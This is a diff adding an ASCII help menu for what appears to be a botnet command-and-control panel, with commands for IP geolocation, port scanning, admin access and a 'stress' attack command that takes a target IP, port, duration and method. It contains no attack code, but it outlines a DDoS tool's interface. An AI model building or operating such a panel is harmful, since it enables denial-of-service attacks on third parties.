@@ -1,0 +1,13 @@
+  ╔══════════════════════════════════════════════════════════════════════════╗
+  ║                               HELP                                       ║
+  ╠══════════════╦═════════════════════╦═════════════════════════════════════╣
+  ║   Command    ║  Description        ║  Command Usage                      ║
+  ╠══════════════╬═════════════════════╬═════════════════════════════════════╣
+  ║ Help         ║ Command List        ║  help                               ║
+  ║ Info         ║ CNC & Acc Info      ║  info                               ║
+  ║ Geo Locator  ║ Geo Locate an IP    ║  geo <ip>                           ║
+  ║ Port Scan    ║ Scan for open ports ║  scan <ip>                          ║
+  ║ Stresser     ║ Attack Hub          ║  stress <ip> <port> <time> <method> ║
+  ║ Admin        ║ Admin Commands      ║  admin                              ║
+  ╚══════════════════════════════════════════════════════════════════════════╝
+
